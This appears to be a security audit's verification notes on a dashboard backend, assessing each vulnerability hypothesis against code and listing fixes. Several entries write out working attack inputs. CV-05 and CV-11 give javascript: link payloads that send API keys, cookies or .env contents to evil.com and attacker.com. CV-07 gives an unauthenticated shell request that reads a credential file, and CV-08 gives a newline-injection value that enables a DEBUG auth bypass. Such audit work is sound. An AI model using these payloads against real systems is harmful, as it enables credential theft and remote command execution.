# Round 3 Hypotheses — causal-verifier-01
# Dashboard Backend — Causal / Counterfactual Verification

---

## CV-01: CROSS-01 — API Key Disclosure + Cross-Origin Env Injection

- Source: CROSS-01
- Verdict: PARTIALLY_CONFIRMED
- Evidence:
  - `dashboard/routes/auth.py:43-44` — `"access_token": _API_KEY` confirmed: raw key in login response body
  - `dashboard/api.py:108-113` — CORS: `allow_origins=["*"]`, `allow_headers=["*"]` — X-API-Key header IS allowed cross-origin
  - `allow_credentials` is NOT set (defaults to False) — browsers will NOT send cookies cross-origin, but headers can be sent
  - `dashboard/routes/system.py:254` — `save_env` requires `get_current_user` — needs valid key OR DEBUG
  - `dashboard/api.py:18` — `load_dotenv(_env_file, override=False)` — the env write only takes effect on restart AND only if `OSTWIN_API_KEY` is not already in the process environment
  - `dashboard/routes/system.py:52-68` — `_serialize_env`: `lines.append(f"{key}={value}")` — NO sanitization; newline injection in key or value is feasible
- Counterfactual: Would NOT be exploitable if: (a) login response returned an opaque session token instead of the raw API key, OR (b) `allow_headers` excluded `X-API-Key`, OR (c) `_serialize_env` escaped newlines. The `override=False` flag means this requires a restart AND the env var not already being set.
- Combined severity: HIGH
- Fragility: Fragile — requires API key obtained via other means (XSS or network intercept), AND server restart to activate DEBUG, AND `OSTWIN_API_KEY` not already set in system environment

---

## CV-02: CROSS-02 — SSE Reconnaissance Enables Plan-ID-Based Second-Order Injection

- Source: CROSS-02
- Verdict: CONFIRMED
- Evidence:
  - `dashboard/routes/rooms.py:159-181` — SSE endpoint has NO auth; subscribes to `global_state.broadcaster.subscribe_sse()`
  - `dashboard/tasks.py:192` — `broadcaster.broadcast("plans_updated", {})` — note: payload is empty `{}` for plan updates; plan_id may NOT be directly in event
  - `dashboard/tasks.py:95,117,137,166` — room events DO include room details in payload
  - `dashboard/routes/plans.py:461-502` — `create_plan` has no auth; returns `{"plan_id": ..., "url": ...}` in HTTP response body — attacker gets plan_id directly from the response, does NOT need SSE
  - `dashboard/routes/plans.py:1128-1152` — `refine_plan_endpoint` has NO auth; accepts plan_id; reads plan file from disk
  - `dashboard/routes/plans.py:1134-1138` — `plan_content = p_file.read_text()` when plan_id provided; passes to `refine_plan(user_message=request.message, plan_content=plan_content)`
- Counterfactual: Would NOT be exploitable if: refine endpoint required auth, OR plan create returned no plan_id to caller (not feasible), OR plan content was sanitized before LLM.
- Additional finding: plan_id returned directly in HTTP 200 response to create_plan — SSE is not even needed; the attack is simpler than hypothesized.
- Combined severity: HIGH
- Fragility: Robust — requires only network access; no config dependency; both steps need zero auth

---

## CV-03: CROSS-03 — Working Dir Injection + read_room Subprocess Side Effect

- Source: CROSS-03
- Verdict: PARTIALLY_CONFIRMED
- Evidence:
  - `dashboard/api_utils.py:653-687` — `resolve_plan_warrooms_dir` confirmed: reads `working_dir` from meta.json (line 665), constructs path `wd / ".war-rooms"` with NO validation — absolute paths accepted
  - `dashboard/routes/plans.py:461` — `create_plan` has no auth; `working_dir` from request stored verbatim in meta.json (line 478)
  - `dashboard/api_utils.py:75-87` — `read_room` confirmed: checks for `run_pytest_now` file, runs `["pwsh", "-File", str(AGENTS_DIR / "debug_test.ps1")]`
  - `dashboard/routes/plans.py:1366-1387` — authenticated endpoint calls `read_room()` with dirs from `resolve_plan_warrooms_dir()` — this is the bridge from unauthenticated plant to authenticated trigger
  - Full chain requires: (1) attacker can write files to the working_dir target (not guaranteed), (2) authenticated user must request the specific plan's room detail endpoint
- Counterfactual: Would NOT work if: attacker cannot write files to the target working_dir (e.g., /etc is read-only for non-root), OR no authenticated user requests that plan's rooms.
- Combined severity: MEDIUM
- Fragility: Fragile — requires attacker to have write access to an arbitrary filesystem directory AND authenticated user to trigger the read_room path

---

## CV-04: CROSS-04 — fe_catch_all Path Traversal Exposes Source Files

- Source: CROSS-04
- Verdict: PARTIALLY_CONFIRMED
- Evidence:
  - `dashboard/api.py:147-200` — `fe_catch_all` confirmed: `exact = FE_OUT_DIR / path`, then `if exact.is_file(): return FileResponse(str(exact))` — NO path jail, NO containment check
  - Python `Path.__truediv__` does NOT strip `..` components — `Path("/a/b/c") / "../../x"` = `Path("/a/b/c/../../x")` which resolves to `/a/x` when `.resolve()` is called, but here `.resolve()` is NOT called — FileResponse uses the raw string `str(exact)` which the OS resolves
  - The route is only active when `USE_FE = True` (FE_OUT_DIR exists)
  - FE_OUT_DIR = `dashboard/fe/out` — depth from project root: `<project_root>/dashboard/fe/out`
  - Traversal: `GET /../../auth.py` → `FE_OUT_DIR / "../../auth.py"` = `<project_root>/dashboard/fe/out/../../auth.py` = `<project_root>/dashboard/auth.py`
  - FastAPI URL path normalization: FastAPI may normalize `/../` in URL paths before passing to route handler — this requires live testing to confirm
- Counterfactual: Would NOT be exploitable if: FastAPI normalizes `..` before route handler receives path param, OR `FileResponse` refuses to serve files outside a configured root, OR FE_OUT_DIR does not exist (USE_FE = False).
- Combined severity: HIGH (if FastAPI does not normalize)
- Fragility: Fragile — depends on FastAPI's URL normalization behavior for `..` in path parameters; NEEDS live verification

---

## CV-05: CROSS-05 — Unauthenticated Plan Create → Stored XSS

- Source: CROSS-05
- Verdict: INVALIDATED (for traditional XSS)
- Evidence:
  - `dashboard/fe/src/lib/markdown-renderer.tsx:16-23` — `escapeHtml` function confirmed: escapes `&`, `<`, `>`, `"` before any rendering
  - ALL text content passes through `escapeHtml()` before being passed to `processInline()` — headers (line 156), checkboxes (line 176), bullets (line 192), paragraphs (line 204)
  - **HOWEVER**: Link URLs are NOT escaped. Line 90: `href={match[2]}` — the URL from `[text](url)` is set directly on the anchor element. This allows `[click me](javascript:alert(document.cookie))` — a `javascript:` protocol XSS.
  - `dangerouslySetInnerHTML` use in `AuthOverlay.tsx:88` is only for CSS animation keyframes — hardcoded string, not user-controlled.
- Revised finding: Traditional `<script>` XSS is blocked by escapeHtml. But `javascript:` URI in markdown links is NOT blocked. An attacker-created plan with `[click me](javascript:fetch('/api/auth/token').then(r=>r.json()).then(d=>fetch('https://evil.com/?k='+d.access_token)))` could steal the API key when a legitimate user clicks the link.
- Counterfactual: Traditional XSS is blocked. javascript: URI XSS requires user to CLICK a link. This is lower severity than initially hypothesized.
- Combined severity: MEDIUM (requires user click; steals API key from /api/auth/token response)
- Fragility: Fragile — requires user interaction (clicking the malicious link in the plan content); not drive-by

---

## CV-06: CROSS-06 — DEBUG Mode + X-User Spoofing Interaction

- Source: CROSS-06
- Verdict: CONFIRMED
- Evidence:
  - `dashboard/auth.py:79-81` — DEBUG bypass returns `{"username": request.headers.get("x-user", "debug-user")}`
  - `dashboard/auth.py:96-97` — Even with valid key, `username = request.headers.get("x-user", "api-key-user")` — X-User overrides identity in ALL cases
  - Grep for `user["username"]` in route handlers returns NO results — no current RBAC decisions based on username
  - The combination is a future risk: if any route is added that checks `user["username"] == "admin"`, the bypass is immediately exploitable
  - Currently: the user dict is returned but not used for authorization beyond authentication
- Counterfactual: Currently unexploitable for privilege escalation (no RBAC exists). But the mechanism is in place for future abuse.
- Combined severity: MEDIUM (current) → HIGH (if RBAC added)
- Fragility: Fragile — currently no RBAC in codebase; severity depends on future development

---

## CV-07: Q7 — shell_command Parameter Type Verification

- Source: Q7
- Verdict: CONFIRMED — CRITICAL
- Evidence:
  - `dashboard/routes/system.py:167` — `async def shell_command(command: str):`
  - In FastAPI, function parameters in route handlers that are not declared as `Body()`, `Form()`, or part of a Pydantic model are treated as QUERY parameters for non-body methods. For `POST` endpoints with a simple type, FastAPI treats it as a query parameter.
  - This means: `POST /api/shell?command=id` — no Content-Type header needed, no JSON body needed
  - The command can also be URL-encoded: `POST /api/shell?command=cat+~%2F.ostwin%2F.env`
  - No auth, no validation confirmed
- Counterfactual: Would require auth if `Depends(get_current_user)` were added. Would limit shell injection if `shell=False` and args were passed as a list.
- Combined severity: CRITICAL
- Fragility: Robust — no config dependency, no version dependency, trivially exploitable

---

## CV-08: Q8 — _serialize_env Newline Injection

- Source: Q8
- Verdict: CONFIRMED
- Evidence:
  - `dashboard/routes/system.py:52-68` — `_serialize_env`:
    ```python
    elif t == "var":
        key = e.get("key", "")
        value = e.get("value", "")
        if e.get("enabled", True):
            lines.append(f"{key}={value}")
    ```
  - `key` and `value` are taken directly from the request body dict with no sanitization
  - If `key = "A\nOSTWIN_API_KEY"` and `value = "x\nDEBUG"`, then `lines.append("A\nOSTWIN_API_KEY=x\nDEBUG")` results in three lines in the joined output: `A`, `OSTWIN_API_KEY=x`, `DEBUG`
  - `_parse_env` (line 45) processes `OSTWIN_API_KEY=x` as a var with key=`OSTWIN_API_KEY` and value=`x` — an attacker would need value to also be `DEBUG` specifically
  - Simpler injection: `key="SAFE_KEY"`, `value="safe_value\nOSTWIN_API_KEY=DEBUG"` → file contains `SAFE_KEY=safe_value\nOSTWIN_API_KEY=DEBUG` — correct injection
  - `load_dotenv(override=False)` at startup reads this; since `OSTWIN_API_KEY` is not yet in env (first run or after clean), it loads `DEBUG`
- Counterfactual: Would NOT work if: (a) `_serialize_env` stripped newlines from key/value, OR (b) `load_dotenv(override=True)` was not the default (it defaults to False, which is actually correct behavior here — takes existing env over file), OR (c) the API key is already in the process environment.
- Combined severity: HIGH (requires auth, but activates CRITICAL bypass on restart)
- Fragility: Fragile — requires authenticated access + server restart + OSTWIN_API_KEY not in system env

---

## CV-09: Q9 — read_room Subprocess Side Effect

- Source: Q9
- Verdict: CONFIRMED (mechanism), FRAGILE (exploitability)
- Evidence:
  - `dashboard/api_utils.py:75-87` — Confirmed: `if (room_dir / "run_pytest_now").exists(): subprocess.run(["pwsh", "-File", str(AGENTS_DIR / "debug_test.ps1")], ...)`
  - Command is NOT injectable — it's hardcoded. Only `AGENTS_DIR` could change it, but that requires env manipulation.
  - Side effects of debug_test.ps1 depend on its contents (not found in scope). Could be significant (test runner, diagnostic tool).
  - This triggers synchronously in `read_room()` which is called during room listing.
  - `unlink` is called after subprocess run, so it won't re-trigger on next call
- Counterfactual: Would not trigger if: no one can create a `run_pytest_now` file in a room directory. Requires write access to a directory that will be passed to read_room.
- Combined severity: LOW-MEDIUM (command is fixed, but execution triggered by file presence)
- Fragility: Fragile — requires write access to room directory (typically requires OS-level access or prior RCE)

---

## CV-10: Q10 — fe_catch_all Path Normalization

- Source: Q10
- Verdict: NEEDS_DEEPER
- Evidence:
  - `dashboard/api.py:146` — Route defined as `@app.api_route("/{path:path}", ...)` — FastAPI `path` converter matches everything including slashes
  - `FE_OUT_DIR / path` — Python's Path operator does NOT normalize `..` before OS resolution
  - `FileResponse(str(exact))` — uses the raw path string; OS resolves `..` at open time
  - FastAPI and Starlette do perform URL normalization (e.g., merging `//`, stripping `.`), but behavior for `..` with the `path` converter needs live testing
  - Starlette's router typically does NOT redirect `..` in path params — it passes them through
  - Concern: Most modern web frameworks normalize `%2F` and `..` in URL paths at the HTTP parsing level. If the ASGI server (uvicorn) or Starlette normalizes `/../` to `/` before route matching, the traversal fails.
- Counterfactual: Exploitable if uvicorn/Starlette passes raw `..` to route handler. Not exploitable if URL normalization occurs before routing.
- Combined severity: HIGH if confirmed
- Fragility: Fragile — depends on framework behavior; NEEDS live testing with actual request

---

## CV-11: Additional Finding — Link href javascript: URI in Markdown Renderer

- Source: PH-10 / CROSS-05 extension
- Verdict: CONFIRMED
- Evidence:
  - `dashboard/fe/src/lib/markdown-renderer.tsx:83-94` — link processing extracts URL via regex `\[([^\]]+)\]\(([^)]+)\)` and sets `href={match[2]}` directly — no URL scheme validation
  - `escapeHtml` is applied to text content but NOT to the URL portion (match[2] is used raw)
  - Payload: `[click me](javascript:void(fetch('/api/auth/token',{method:'POST',body:JSON.stringify({key:''}),headers:{'Content-Type':'application/json'}}).then(r=>r.json()).then(d=>navigator.sendBeacon('https://attacker.com/',d.access_token))))`
  - When a legitimate user with a valid session clicks this link in the plan editor, it executes the javascript: URI
  - However: `/api/auth/token` with empty key would get 401. The actual attack is: steal the key from `document.cookie` or from a prior request.
  - More practical: `[click](javascript:navigator.sendBeacon('https://evil.com/', document.cookie))` — attempts to exfiltrate cookies, but `httponly=True` blocks cookie access from JS
  - Most practical: `[click](javascript:fetch('/api/env').then(r=>r.json()).then(d=>navigator.sendBeacon('https://evil.com/', JSON.stringify(d))))` — exfiltrates .env contents if user is authenticated
- Counterfactual: Would be blocked if the markdown renderer validated href against an allowlist of safe schemes (http, https only).
- Combined severity: MEDIUM (requires user interaction — clicking link)
- Fragility: Fragile — requires user to click the link; cannot be drive-by

---

## CV-12: Additional Finding — plans_updated Broadcast Lacks plan_id (SSE Path Simpler Than Thought)

- Source: CROSS-02 refinement
- Verdict: CONFIRMED — Attack simpler than hypothesized
- Evidence:
  - `dashboard/tasks.py:192` — `broadcaster.broadcast("plans_updated", {})` — empty payload, no plan_id
  - `dashboard/routes/plans.py:502` — `create_plan` returns `{"plan_id": plan_id, "url": ..., ...}` directly in HTTP 200 response
  - Attacker does NOT need SSE to get plan_id — it is in the response body of the unauthenticated POST /api/plans/create
  - The SSE stream is useful for monitoring ongoing activity but not necessary for the injection attack
- Combined severity: Refines CV-02 — attack is more direct and reliable (single response, no subscription needed)
- Fragility: Robust — plan_id always returned in create response
